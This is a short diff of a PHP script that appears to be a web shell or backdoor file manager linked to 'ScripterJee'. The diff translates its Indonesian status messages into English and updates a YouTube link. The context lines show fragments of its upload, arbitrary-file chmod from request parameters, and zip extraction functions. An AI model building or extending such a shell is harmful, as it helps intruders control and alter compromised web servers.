@@ -266,7 +266,7 @@ function aksiUpload($dir){
         swall($swa,$text,$dir);
       }else{
         $swa = "error";
-        $text = "Gagal Upload File";
+        $text = "Fail Upload File";
         swall($swa,$text,$dir);
       }
     }else{
@@ -288,7 +288,7 @@ function chmodFile($dir,$file,$nfile){
     if(@chmod($_GET['file'],$_POST['perm'])){
       echo '<font color="lime">Change Permission Berhasil</font><br/>';
     }else{
-      echo '<font color="white">Change Permission Gagal</font><br/>';
+      echo '<font color="white">Change Permission Fail</font><br/>';
     }
   }
   exit;
@@ -1888,10 +1888,10 @@ function zipMenu($dir,$file){
         echo Zip_Extrack($filename, $dir);
         unlink($filename);
         $swa = "success";
-        $text = "Berhasil Mengekstrak Zip";
+        $text = "Extracting Successfully Zip";
         swall($swa,$text,$dir);
       }else{
-        echo "<b>Gagal!</b>";
+        echo "<b>Fail!</b>";
       }
     }
     echo "<div class='row'><div class='col-md-6 mb-3'><h5>Zip Backup</h5>
@@ -1904,10 +1904,10 @@ function zipMenu($dir,$file){
       $fol = $_POST['folder'];
       if(Zip($fol, $_POST["folder"].'/'.$exzip)){
         $swa = "success";
-        $text = "Berhasil Membuat Zip";
+        $text = "Zip Created successfully";
         swall($swa,$text,$dir);
       }else{
-        echo "<b>Gagal!</b>";
+        echo "<b>Fail!</b>";
       }
     }
     echo "</div>
@@ -2094,7 +2094,7 @@ function zipMenu($dir,$file){
       <div class="collapse navbar-collapse" id="info">
         <ul>
           <a href="https://t.me/+AGp0b1bskxI0YzM1" class="lain"><i class="fa fa-telegram tambah"></i></a>
-          <a href="https://www.youtube.com/ScripterJee" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
+          <a href="https://www.youtube.com/@ScripterJee" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
           <a href="https://sjee.online" class="lain"><i class="fa fa-globe tambah"></i></a>
         </ul>
       </div>
